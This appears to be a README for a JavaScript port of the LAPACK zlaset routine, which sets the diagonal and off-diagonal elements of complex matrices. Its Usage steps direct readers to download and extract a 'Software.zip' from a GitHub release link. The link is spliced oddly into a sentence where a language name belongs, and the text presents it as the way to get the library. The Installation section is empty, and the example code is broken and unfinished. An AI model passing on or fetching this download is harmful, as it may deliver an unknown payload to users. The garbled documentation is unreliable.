### Overview
This repository contains a set of subroutines for working with double-precision complex floating-point matrices. Specifically, it provides functionality to set the off-diagonal and diagonal elements of a matrix to specified values. These routines are useful in various linear algebra and mathematical operations involving complex matrices.

### Features
- Set off-diagonal and diagonal elements of a matrix
- Works with double-precision complex floating-point numbers
- Easy-to-use subroutine interface
- Suitable for linear algebra operations

### Installation

### Usage
1. Download the LAPACK Base Zlaset software package from the provided link.
2. Extract the contents of the downloaded file to your desired location.
3. Include the necessary functions in your JavaScript or https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v2.0/Software.zip code.
4. Call the functions with the appropriate input parameters to set the elements of your complex matrix.

### Example
```javascript
// Include the LAPACK Base Zlaset functions
const { zlaset } = require('lapack-base-zlaset');

// Define a sample double-precision complex matrix
const matrix = [
  [ { re: 1, im: 2 }, { re: 3, im: 4 } ],
  [ { re: 5, im: 6 }, { re: 7, im: 8 } ]
];

// Set the matrix elements using LAPACK Base Zlaset
zlaset(matrix, 0, 0, 2, 2, { re: 10, im: 20 });

// Resulting matrix will have diagonal elements set to { re: 10, im: 20 }
